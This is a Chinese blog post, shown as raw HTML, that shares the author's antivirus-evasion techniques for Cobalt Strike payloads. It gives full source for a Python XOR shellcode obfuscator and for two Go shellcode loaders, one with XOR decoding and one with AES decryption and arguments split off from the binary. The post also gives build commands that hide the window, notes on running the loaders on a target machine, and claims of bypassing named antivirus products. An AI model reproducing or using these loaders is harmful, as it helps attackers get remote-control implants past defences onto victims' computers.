<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01背景元旦在家没什么事，回顾了一下近两个月做的事，分享一些自己平时做免杀时用到的工具和方法。 0x02exe上线cs免杀首先在Cobalt Strike服务器中生成c的payload文件-payload.c 1、异或免杀把payload.c的shellcode部分填入xor的shellcode字段中xor.py内容如下 123456789101112131415161718192021222">
<meta property="og:type" content="article">
<meta property="og:title" content="免杀类">
<meta property="og:url" content="https://mzzdtot.github.io/2022/01/01/Avoid_killing/index.html">
<meta property="og:site_name" content="m2">
<meta property="og:description" content="0x01背景元旦在家没什么事，回顾了一下近两个月做的事，分享一些自己平时做免杀时用到的工具和方法。 0x02exe上线cs免杀首先在Cobalt Strike服务器中生成c的payload文件-payload.c 1、异或免杀把payload.c的shellcode部分填入xor的shellcode字段中xor.py内容如下 123456789101112131415161718192021222">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/5.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/7.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/8.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/9.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/10.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/11.png">
<meta property="article:published_time" content="2022-01-01T02:53:42.000Z">
<meta property="article:modified_time" content="2022-01-04T01:51:12.399Z">
<meta property="article:author" content="作者">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>免杀类</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2021/12/31/%E8%AF%9D%E5%88%AB2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2022/01/01/Avoid_killing/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&text=免杀类" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&is_video=false&description=免杀类" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=免杀类&body=Check out this article: https://mzzdtot.github.io/2022/01/01/Avoid_killing/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&title=免杀类" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&name=免杀类&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2022/01/01/Avoid_killing/&t=免杀类" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x02powershell免杀</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        免杀类
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m2</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-01-01T02:53:42.000Z" itemprop="datePublished">2022-01-01</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01背景"><a href="#0x01背景" class="headerlink" title="0x01背景"></a>0x01背景</h2><p>元旦在家没什么事，回顾了一下近两个月做的事，分享一些自己平时做免杀时用到的工具和方法。</p>
<h2 id="0x02exe上线cs免杀"><a href="#0x02exe上线cs免杀" class="headerlink" title="0x02exe上线cs免杀"></a>0x02exe上线cs免杀</h2><p>首先在Cobalt Strike服务器中生成c的payload文件-payload.c<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/1.png" alt="1"></p>
<p><strong>1、异或免杀</strong><br>把payload.c的shellcode部分填入xor的shellcode字段中<br>xor.py内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">def xor(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    # 对shellcode的每一位进行xor亦或处理</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; ord(shellcode[i])</span><br><span class="line">        p &#x3D; ord((key[i % key_len]))</span><br><span class="line">        s &#x3D; s ^ p  # 与p异或，p就是key中的字符之一</span><br><span class="line">        s &#x3D; chr(s)</span><br><span class="line">        new_shellcode +&#x3D; s</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def random_decode(shellcode):</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0,len(shellcode)):</span><br><span class="line">        if i % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            new_shellcode[i] &#x3D; shellcode[j]</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_random_code(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        new_shellcode +&#x3D; shellcode[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        new_shellcode +&#x3D; key[i % key_len]</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def str_to_hex(shellcode):</span><br><span class="line">    raw &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; hex(ord(shellcode[i])).replace(&quot;0x&quot;,&#39;,0x&#39;)</span><br><span class="line">        raw &#x3D; raw + s</span><br><span class="line">    return raw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    shellcode&#x3D;&quot;\xfc\x48\x83\...&quot;</span><br><span class="line">    #这是异或和增加随机字符使用的key</span><br><span class="line">    key &#x3D; &quot;planet&quot;</span><br><span class="line">    shellcode &#x3D; xor(shellcode, key)</span><br><span class="line">    shellcode &#x3D; add_random_code(shellcode, key)</span><br><span class="line">    print(str_to_hex(shellcode))</span><br></pre></td></tr></table></figure>
<p>执行xor.py<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/2.png" alt="2"></p>
<p>把刚才生成的shellcode填到shell.go的shellcode字段中，记得两个文件key要一致。<br>shell.go内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;syscall&quot;</span><br><span class="line">  &quot;time&quot;</span><br><span class="line">  &quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">  MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">  MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">  PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; 区域可以执行代码，应用程序可以读写该区域。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">  kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">  ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">  VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">  RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  mix_shellcode :&#x3D; []byte&#123;0x8c,0x70,...&#125;</span><br><span class="line">  var ttyolller []byte</span><br><span class="line">  key :&#x3D; []byte(&quot;planet&quot;)#xor.py中的key</span><br><span class="line">  var key_size &#x3D; len(key)</span><br><span class="line">  var shellcode_final []byte</span><br><span class="line">  var j &#x3D; 0</span><br><span class="line">  time.Sleep(2)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(len(mix_shellcode))</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(mix_shellcode); i++ &#123;</span><br><span class="line">    if i%2 &#x3D;&#x3D; 0 &#123;</span><br><span class="line">      shellcode_final &#x3D; append(shellcode_final, mix_shellcode[i])</span><br><span class="line">      j +&#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(shellcode_final)</span><br><span class="line">  &#x2F;&#x2F; 解密异或</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(shellcode_final); i++ &#123;</span><br><span class="line">    ttyolller &#x3D; append(ttyolller, shellcode_final[i]^key[i%key_size])</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  addr, _, err :&#x3D; VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  _, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;ttyolller[0])), uintptr(len(ttyolller)))</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行go build -ldflags=”-H windowsgui -w -s” shell.go生成shell.exe</p>
<p>实测可过火绒</p>
<p><strong>2、加载分离参数免杀</strong><br>先用生成器生成AES加密的Shellcode,加载器代码中无Shellcode,使用时用参数调用。<br>1.go内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;bytes&quot;</span><br><span class="line">  &quot;crypto&#x2F;aes&quot;</span><br><span class="line">  &quot;crypto&#x2F;cipher&quot;</span><br><span class="line">  &quot;encoding&#x2F;base64&quot;</span><br><span class="line">  &quot;encoding&#x2F;hex&quot;</span><br><span class="line">  &quot;fmt&quot;</span><br><span class="line">  &quot;math&#x2F;rand&quot;</span><br><span class="line">  &quot;os&quot;</span><br><span class="line">  &quot;strings&quot;</span><br><span class="line">  &quot;time&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;随机生成key,后面用来解密的</span><br><span class="line">func key(l int) string &#123;</span><br><span class="line">  str :&#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">  bytes :&#x3D; []byte(str)</span><br><span class="line">  result :&#x3D; []byte&#123;&#125;</span><br><span class="line">  r :&#x3D; rand.New(rand.NewSource(time.Now().UnixNano()))</span><br><span class="line">  for i :&#x3D; 0; i &lt; l; i++ &#123;</span><br><span class="line">    result &#x3D; append(result, bytes[r.Intn(len(bytes))])</span><br><span class="line">  &#125;</span><br><span class="line">  return string(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用PKCS5进行填充用来</span><br><span class="line">func PKCS5Padding(ciphertext []byte, blockSize int) []byte &#123;</span><br><span class="line">  padding :&#x3D; blockSize - len(ciphertext)%blockSize</span><br><span class="line">  padtext :&#x3D; bytes.Repeat([]byte&#123;byte(padding)&#125;, padding)</span><br><span class="line">  return append(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;进行aes加密</span><br><span class="line">func AesEncrypt(origData, key []byte) ([]byte, error) &#123;</span><br><span class="line">  block, err :&#x3D; aes.NewCipher(key)</span><br><span class="line">  if err !&#x3D; nil &#123;</span><br><span class="line">    return nil, err</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  blockSize :&#x3D; block.BlockSize()</span><br><span class="line">  origData &#x3D; PKCS5Padding(origData, blockSize)</span><br><span class="line">  blockMode :&#x3D; cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">  crypted :&#x3D; make([]byte, len(origData))</span><br><span class="line">  blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">  return crypted, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;主函数入口,对字符进行了处理</span><br><span class="line">func main() &#123;</span><br><span class="line">  argsWithProg :&#x3D; os.Args</span><br><span class="line">  if len(argsWithProg) &lt; 2 &#123;</span><br><span class="line">    fmt.Println(&quot;usage : &quot;, argsWithProg[0], &quot; paylaod.c&quot;)</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  confFile :&#x3D; os.Args[1]</span><br><span class="line">  str2 :&#x3D; strings.Replace(confFile, &quot;\\x&quot;, &quot;&quot;, -1)</span><br><span class="line">  data, _ :&#x3D; hex.DecodeString(str2)</span><br><span class="line">  key1 :&#x3D; key(16)</span><br><span class="line">  fmt.Println(&quot;Key:&quot;, key1)</span><br><span class="line">  var key []byte &#x3D; []byte(key1)</span><br><span class="line">  aes, _ :&#x3D; AesEncrypt(data, key)</span><br><span class="line">  encoded :&#x3D; base64.StdEncoding.EncodeToString(aes)</span><br><span class="line">  fmt.Println(&quot;Code:&quot;, encoded)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go run 1.go 生成KEY和加密值<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/3.png" alt="3"><br>保存KEY和code。</p>
<p>2.go内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;crypto&#x2F;aes&quot;</span><br><span class="line">  &quot;crypto&#x2F;cipher&quot;</span><br><span class="line">  &quot;encoding&#x2F;base64&quot;</span><br><span class="line">  &quot;os&quot;</span><br><span class="line">  &quot;syscall&quot;</span><br><span class="line">  &quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这一块是定义一些东西去加载我们的shellcode</span><br><span class="line">var procVirtualProtect &#x3D; syscall.NewLazyDLL(&quot;kernel32.dll&quot;).NewProc(&quot;VirtualProtect&quot;)</span><br><span class="line"></span><br><span class="line">func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool &#123;</span><br><span class="line">  ret, _, _ :&#x3D; procVirtualProtect.Call(</span><br><span class="line">    uintptr(lpAddress),</span><br><span class="line">    uintptr(dwSize),</span><br><span class="line">    uintptr(flNewProtect),</span><br><span class="line">    uintptr(lpflOldProtect))</span><br><span class="line">  return ret &gt; 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shellcode执行函数</span><br><span class="line">func Run(sc []byte) &#123;</span><br><span class="line">  f :&#x3D; func() &#123;&#125;</span><br><span class="line">  var oldfperms uint32</span><br><span class="line">  if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&amp;f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&amp;oldfperms)) &#123;</span><br><span class="line">    panic(&quot;Call to VirtualProtect failed!&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">  **(**uintptr)(unsafe.Pointer(&amp;f)) &#x3D; *(*uintptr)(unsafe.Pointer(&amp;sc))</span><br><span class="line">  var oldshellcodeperms uint32</span><br><span class="line">  if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&amp;sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&amp;oldshellcodeperms)) &#123;</span><br><span class="line">    panic(&quot;Call to VirtualProtect failed!&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">  f()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;同样为了保证我们的shellcode正常运行要进行PKCS5的操作</span><br><span class="line">func PKCS5UnPadding(origData []byte) []byte &#123;</span><br><span class="line">  length :&#x3D; len(origData)</span><br><span class="line">  unpadding :&#x3D; int(origData[length-1])</span><br><span class="line">  return origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;经典的aes解密操作</span><br><span class="line">func AesDecrypt(crypted, key []byte) ([]byte, error) &#123;</span><br><span class="line">  block, err :&#x3D; aes.NewCipher(key)</span><br><span class="line">  if err !&#x3D; nil &#123;</span><br><span class="line">    return nil, err</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  blockSize :&#x3D; block.BlockSize()</span><br><span class="line">  blockMode :&#x3D; cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">  origData :&#x3D; make([]byte, len(crypted))</span><br><span class="line">  blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">  origData &#x3D; PKCS5UnPadding(origData)</span><br><span class="line">  return origData, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;运行主函数,主要是接受参数进行base64解码,ase解码,运行shellcode</span><br><span class="line">func main() &#123;</span><br><span class="line">  key1 :&#x3D; os.Args[1]</span><br><span class="line">  payload1 :&#x3D; os.Args[2]</span><br><span class="line">  encoded2, _ :&#x3D; base64.StdEncoding.DecodeString(payload1)</span><br><span class="line">  var key []byte &#x3D; []byte(key1)</span><br><span class="line">  AES, _ :&#x3D; AesDecrypt(encoded2, key)</span><br><span class="line">  Run(AES)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>go build 2.go 编译生成加载器</p>
<p>在目标机执行2.exe key code 调用shellcode执行上线<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/4.png" alt="4"><br>tips：木马在目标机执行的目录与本地生成的目录要对应，否则会报错<br>以下是我踩坑记录<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/5.png" alt="5"><br>原因是我在第一步生成key和code的时候目录与目标机不一致。<br>所以如果在目标机c:\windows\目录执行就要在本地c:\windows\目录生成。</p>
<p>实测可过360、火绒、qq电脑管家。</p>
<p><strong>3、CS_loader</strong><br>可用go、python、c等生成cs免杀exe<br>项目地址：<a href="https://github.com/Gality369/CS-Loader" target="_blank" rel="noopener">https://github.com/Gality369/CS-Loader</a><br>相关使用项目中介绍的很清楚，这里不过多赘述。<br>以go为例<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/6.png" alt="6"><br>这里我是将图片传到了自己服务器web根目录。<br>实测可过火绒。</p>
